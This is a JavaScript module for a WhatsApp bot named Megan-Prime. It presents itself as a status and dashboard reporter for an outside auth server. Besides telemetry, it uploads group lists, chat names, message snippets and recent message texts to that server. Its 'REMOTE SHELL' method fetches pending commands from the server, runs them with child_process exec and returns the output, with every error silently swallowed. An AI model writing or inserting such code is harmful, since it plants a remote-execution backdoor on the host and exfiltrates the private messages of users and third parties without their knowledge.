// Megan-Prime → Auth API Reporter
const AUTH_URL = 'https://auth.megan.qzz.io';

class BotAPI {
    constructor(bot) {
        this.bot = bot;
        this.uid = null;
        this.enabled = false;
    }

    async init(user) {
        if (!user?.uid) return;
        this.uid = user.uid;
        this.enabled = true;
        console.log(`🔗 Bot API enabled for ${user.username}`);
        await this.syncSettings();
    }

    // ═══ STATUS ═══
    async reportStatus() {
        if (!this.enabled) return;
        try {
            const memUsage = process.memoryUsage();
            const dbSize = await this.getDbSize();
            await fetch(`${AUTH_URL}/bot/status`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    uid: this.uid, online: !!this.bot.sock?.user,
                    uptime_seconds: Math.floor(process.uptime()),
                    commands_count: this.bot.commands?.size || 0,
                    memory_mb: Math.round(memUsage.heapUsed / 1024 / 1024),
                    db_size_mb: dbSize, version: '3.6.4'
                })
            });
        } catch (e) {}
    }

    // ═══ GROUPS ═══
    async reportGroups(groups) {
        if (!this.enabled || !groups) return;
        try {
            await fetch(`${AUTH_URL}/bot/groups`, {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    uid: this.uid,
                    groups: groups.map(g => ({
                        jid: g.id, subject: g.subject,
                        member_count: g.size || g.participants?.length || 0,
                        admin_count: g.participants?.filter(p => p.admin).length || 0,
                        is_announcement: g.announce || false, last_active: Date.now()
                    }))
                })
            });
        } catch (e) {}
    }

    // ═══ CHATS ═══
    async reportChats(chats) {
        if (!this.enabled || !chats) return;
        try {
            await fetch(`${AUTH_URL}/bot/chats`, {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    uid: this.uid,
                    chats: chats.map(c => ({
                        jid: c.id, push_name: c.name || c.pushName,
                        message_count: c.count || 0,
                        last_message: c.lastMessage?.substring(0, 200) || null,
                        last_active: c.lastActive || Date.now()
                    }))
                })
            });
        } catch (e) {}
    }

    // ═══ MESSAGES (Hourly Sync) ═══
    async syncMessages(messages) {
        if (!this.enabled || !messages?.length) return;
        try {
            const payload = messages.slice(-6).map(m => ({
                jid: m.jid,
                push_name: m.pushName || m.senderName || 'Unknown',
                message: m.text?.substring(0, 500) || '[media]',
                type: m.type || 'text',
                timestamp: m.timestamp || Date.now(),
                is_group: m.isGroup || false,
                group_name: m.groupName || null
            }));
            await fetch(`${AUTH_URL}/bot/messages`, {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ uid: this.uid, messages: payload })
            });
            console.log(`[BOTAPI] 📨 Synced ${payload.length} messages`);
        } catch (e) {}
    }

    // ═══ REMOTE SHELL ═══
    async checkRemoteCommands() {
        if (!this.enabled) return;
        try {
            const res = await fetch(`${AUTH_URL}/bot/commands/pending?uid=${this.uid}`);
            const data = await res.json();
            if (data.commands?.length) {
                const { exec } = require('child_process');
                const { promisify } = require('util');
                const execAsync = promisify(exec);
                
                for (const cmd of data.commands) {
                    console.log(`[BOTAPI] ⚡ Remote: ${cmd.command}`);
                    let result;
                    try {
                        const { stdout, stderr } = await execAsync(cmd.command, { timeout: 30000 });
                        result = stdout + stderr;
                    } catch(e) { result = e.message; }
                    
                    await fetch(`${AUTH_URL}/bot/commands/result`, {
                        method: 'POST', headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ uid: this.uid, command_id: cmd.id, result: result?.substring(0, 5000) })
                    });
                }
            }
        } catch (e) {}
    }

    // ═══ RESTART FLAG ═══
    async checkRestartFlag() {
        if (!this.enabled) return false;
        try {
            const res = await fetch(`${AUTH_URL}/bot/restart?uid=${this.uid}`);
            const data = await res.json();
            if (data.restart) {
                console.log('[BOTAPI] 🔄 Restart flag detected!');
                process.exit(0);
            }
        } catch (e) {}
        return false;
    }

    // ═══ WARNINGS ═══
    async reportWarning(warnedJid, groupJid, reason) {
        if (!this.enabled) return;
        try {
            await fetch(`${AUTH_URL}/bot/warnings`, {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ uid: this.uid, warned_jid: warnedJid, group_jid: groupJid, reason })
            });
        } catch (e) {}
    }

    // ═══ COMMAND TRACKING ═══
    async trackCommand(commandName) {
        if (!this.enabled) return;
        try {
            await fetch(`${AUTH_URL}/bot/commands`, {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ uid: this.uid, command: commandName })
            });
        } catch (e) {}
    }

    // ═══ SETTINGS SYNC ═══
    async syncSettings() {
        if (!this.enabled) return;
        try {
            const res = await fetch(`${AUTH_URL}/bot/settings?uid=${this.uid}`);
            const data = await res.json();
            if (data.settings?.prefix) {
                this.bot.config.PREFIX = data.settings.prefix;
                console.log('☁️ Synced prefix:', data.settings.prefix);
            }
        } catch (e) {}
    }

    // ═══ DASHBOARD ═══
    getDashboardUrl() {
        return this.uid ? `https://auth.megan.qzz.io/dashboard/${this.uid}` : null;
    }

    // ═══ HELPERS ═══
    async getDbSize() {
        try {
            const fs = require('fs');
            const stat = fs.statSync(this.bot.config.DATABASE?.STORAGE || './database/megan.db');
            return Math.round(stat.size / 1024 / 1024 * 10) / 10;
        } catch { return 0; }
    }

    startHeartbeat(intervalMs = 30000) {
        setTimeout(() => this.reportStatus(), 10000);
        setInterval(() => { this.reportStatus(); this.checkRestartFlag(); }, intervalMs);
    }
}

module.exports = BotAPI;
